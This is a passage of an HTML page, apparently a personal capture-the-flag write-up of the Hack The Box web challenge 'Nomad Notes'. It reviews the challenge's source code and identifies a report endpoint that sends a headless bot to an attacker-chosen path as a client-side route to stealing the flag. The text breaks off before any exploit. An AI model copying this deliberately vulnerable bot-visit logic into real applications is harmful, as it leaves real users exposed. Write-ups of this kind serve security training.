@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr"
+    data-theme="dark"
+    data-layout="centered">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+  <meta name="generator" content="Hugo 0.168.0">
+  <meta name="generator-theme" content="Book Theme: https://github.com/alex-shpak/hugo-book">
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Nomad NotesNomad Notes is a medium-level web challenge from Hack The Box.
+Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
+First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
+Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark">
+<meta name="format-detection" content="telephone=no"><meta property="og:url" content="//localhost:1313/docs/ctf/hack-the-box/challenges-web/nomad-notes/">
+	<meta property="og:site_name" content="Portas">
+	<meta property="og:title" content="Nomad Notes">
+	<meta property="og:description" content="Nomad NotesNomad Notes is a medium-level web challenge from Hack The Box.
+Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
+First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
+Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+		<meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
+
+
+	<meta itemprop="name" content="Nomad Notes">
+	<meta itemprop="description" content="Nomad NotesNomad Notes is a medium-level web challenge from Hack The Box.
+Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
+First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
+Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.">
+	<meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+	<meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+	<meta itemprop="wordCount" content="1461">
+
+<title>Nomad Notes • Portas</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.png" sizes="any">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="//localhost:1313/docs/ctf/hack-the-box/challenges-web/nomad-notes/">
+<link rel="stylesheet" href="/book.min.d2a63061af208ea46d4a5088bdb2c8d297df14bbb9064b630ae0b63dcb664760.css" integrity="sha256-0qYwYa8gjqRtSlCIvbLI0pffFLu5BktjCuC2PctmR2A=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.9b35be230184439742bf457c1001d827b3c47983242b86467107c93f4cf30415.js" integrity="sha256-mzW&#43;IwGEQ5dCv0V8EAHYJ7PEeYMkK4ZGcQfJP0zzBBU=" crossorigin="anonymous"></script>
+  
+</head>
+
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <div class="book-container flex">
+    
+<aside class="book-menu" aria-label="Menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" role="searchbox" enterkeyhint="search"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results" aria-live="polite"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6652e0280f4a0b30fa40b02437030f68" class="toggle" checked />
+    <label for="section-6652e0280f4a0b30fa40b02437030f68" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-58e18b116dcb674821e213ec0945416f" class="toggle" checked />
+    <label for="section-58e18b116dcb674821e213ec0945416f" class="flex">
+      <a role="button" class="">
+        Hack the Box</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-494dc92d9104717a20a45ff4de94fed4" class="toggle" checked />
+    <label for="section-494dc92d9104717a20a45ff4de94fed4" class="flex">
+      <a role="button" class="">
+        Challenges (web)</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="">
+      Breaking Grad</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="">
+      Jerrytok</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/nomad-notes/" class="active">
+      Nomad Notes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="">
+      Templated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/toxic/" class="">
+      Toxic</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b358f1a871f27b6123c59716f1b3428c" class="toggle"  />
+    <label for="section-b358f1a871f27b6123c59716f1b3428c" class="flex">
+      <a role="button" class="">
+        Machines</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/blurry/" class="">
+      Blurry</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/certified/" class="">
+      Certified</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/cicada/" class="">
+      Cicada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="">
+      Monitorsthree</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c7059daadfdbaf53fa1366c3499caad7" class="toggle"  />
+    <label for="section-c7059daadfdbaf53fa1366c3499caad7" class="flex">
+      <a role="button" class="">
+        Juice Shop</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/injection/" class="">
+      Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
+      XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/readme/" class="">
+      Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
+    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
+      <a role="button" class="">
+        Offensive Security</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
+    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
+      <a role="button" class="">
+        Initial Access</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
+      Remote Template Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <header class="book-header hidden">
+      
+  <div class="flex align-center justify-between gap">
+  <input type="checkbox" class="toggle" id="menu-control" />
+  <label for="menu-control" aria-label="Menu">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#menu"></use></svg>
+  </label>
+
+  <div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+
+  
+  <input type="checkbox" class="toggle" id="toc-control" />
+  <label for="toc-control" aria-label="Table of Contents">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#toc"></use></svg>
+  </label>
+  
+</div>
+
+ 
+    </header>
+
+    <main class="book-page">
+      
+      
+  
+
+      
+  <article class="markdown book-article"><h1 id="nomad-notes">Nomad Notes<a class="anchor" href="#nomad-notes" aria-label="Link"></a></h1>
+<figure><img src="/assets/nomad-notes/banner.png">
+</figure>
+
+<p>Nomad Notes is a medium-level web challenge from Hack The Box.</p>
+<h2 id="setup-test-environment">Setup test environment<a class="anchor" href="#setup-test-environment" aria-label="Link"></a></h2>
+<p>For the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.</p>
+<p>First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.</p>
+<figure><img src="/assets/nomad-notes/docker-debbuger-config.png">
+</figure>
+
+<figure><img src="/assets/nomad-notes/debbuger-port.png">
+</figure>
+
+<p>Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.</p>
+<figure><img src="/assets/nomad-notes/app-running.png">
+</figure>
+
+<h2 id="taint-analisys">Taint Analisys<a class="anchor" href="#taint-analisys" aria-label="Link"></a></h2>
+<p>The next objective is to map the application&rsquo;s attack surface, identifying which exposed routes we can interact with and what each one does. This can be done either by interacting with the application and observing the endpoints logged in a proxy, or by reading the source code provided as part of the challenge.</p>
+<p>A hybrid approach is advantageous, as the source code allows us to identify the routes the application exposes, which we can then use to dynamically understand how to interact with them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// routes exported in routes.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">controllers</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../controllers/controllers&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">controllers</span>.<span style="color:#a6e22e">index</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/postcard&#39;</span>, <span style="color:#a6e22e">controllers</span>.<span style="color:#a6e22e">postcard</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/destinations&#39;</span>, <span style="color:#a6e22e">controllers</span>.<span style="color:#a6e22e">destinations</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, <span style="color:#a6e22e">controllers</span>.<span style="color:#a6e22e">report</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;</span></span></code></pre></div><p>After a few interactions with the app, we have a map of the application&rsquo;s routes within the proxy.</p>
+<figure><img src="/assets/nomad-notes/initial-proxy.png">
+ </figure>
+
+<p>Taking advantage of the availability of the source code, the objective of the current phase is to understand the implementation of each available endpoint. This will provide insight into the context of each feature, as well as potential sinks that interact with the inputs sent via the endpoints&rsquo; parameters, and, consequently, potential attack vectors.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//controller.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">report</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">HOST</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/`</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">headers</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isLoopback</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">remoteAddress</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isAllowedOrigin</span>(<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">origin</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;x-carta-auth-key&#39;</span>]) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">botVisit</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">HOST</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/destinations?name=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;x-carta-auth-key&#39;</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;flag=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">FLAG</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">botVisit</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">HOST</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">`/postcard?recipient=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#e6db74">&#39;Friend&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;sender=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#e6db74">&#39;Carta Team&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;message=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#e6db74">&#39;Success! Your card is on its way. Our staff will verify it matches our travel standards. Enjoy the journey!&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;secret=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#e6db74">&#39;Your delivery ID is logged in our system.&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>};</span></span></code></pre></div><p>The first method analyzed is the handler for the <code>/report</code> endpoint.</p>
+<p>This method first checks the origin of the request; it verifies that the request comes from the server itself, that the HTTP origin is validusing the <code>isLoopback</code> and <code>isAllowedOrigin</code> methods, in addition to checking for the presence of the <code>x-carta-auth-key</code> header.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//utils.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLoopback</span>(<span style="color:#a6e22e">addr</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">addr</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">addr</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;::1&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;::1&#39;</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//controller.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isAllowedOrigin</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">origin</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">origin</span>).<span style="color:#a6e22e">origin</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">APP_ORIGIN</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};</span></span></code></pre></div><p>If the conditions are met, the <code>botVisit</code> method opens a Chrome browser and navigates to the <code>/destinations</code> route, passing the <code>x-carta-auth-key</code> header as the value for a <code>name</code> parameter, while also including the flag value as an additional parameter in the query string.</p>
+<p>If the conditions do not match, the <code>botVisit</code> method directs the browser to an arbitrary endpoint, which is passed via the <code>path</code> query string parameter of the <code>/report</code> endpoint.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//bot.js
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">botVisit</span>(<span style="color:#a6e22e">url</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`[BOT] Visiting: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">browser</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">puppeteer</span>.<span style="color:#a6e22e">launch</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">headless</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">executablePath</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">execPath</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">args</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;--no-sandbox&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;--disable-setuid-sandbox&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;--disable-dev-shm-usage&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;--disable-gpu&#39;</span>,
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">url</span>, { <span style="color:#a6e22e">waitUntil</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;domcontentloaded&#39;</span>, <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">8000</span> });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">4000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;[BOT] Visit complete.&#39;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">`[BOT] Error visiting </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:`</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">message</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>This indicates that a client-side attack is required to get the bot to access the <code>/destinations</code> route, with the flag included in the query string, along with a way to read that query string and extract the flag&rsquo;s value.</p>
+<p>However, it is important to note that the application employs strict CORS policies, including the requirement for a <code>nonce</code> to ensure that only valid scripts are executed, which makes XSS attacks significantly more difficult.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//app.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">nonce</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">generateNonce</span>(<span style="color:#ae81ff">24</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>, <span style="color:#e6db74">`default-src &#39;none&#39;; connect-src &#39;self&#39;; script-src &#39;nonce-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">nonce</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;; style-src &#39;self&#39;; img-src &#39;self&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; form-action &#39;self&#39;; frame-ancestors &#39;none&#39;; require-trusted-types-for &#39;script&#39;;`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">nonce</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nonce</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>});</span></span></code></pre></div><p>Examining the handler for the <code>/postcard</code> route, it can be noted that the route parameters are passed through a function that sanitizes HTML characters, then inserted into an HTML template and subsequently rendered.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//controller.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">postcard</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">recipient</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Traveler&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sender</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Carta Staff&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Exploring the world, one card at a time.&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;P.S. I left the key under the mat.&#39;</span>
+</span></span><span style="display:flex;"><span>    } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>
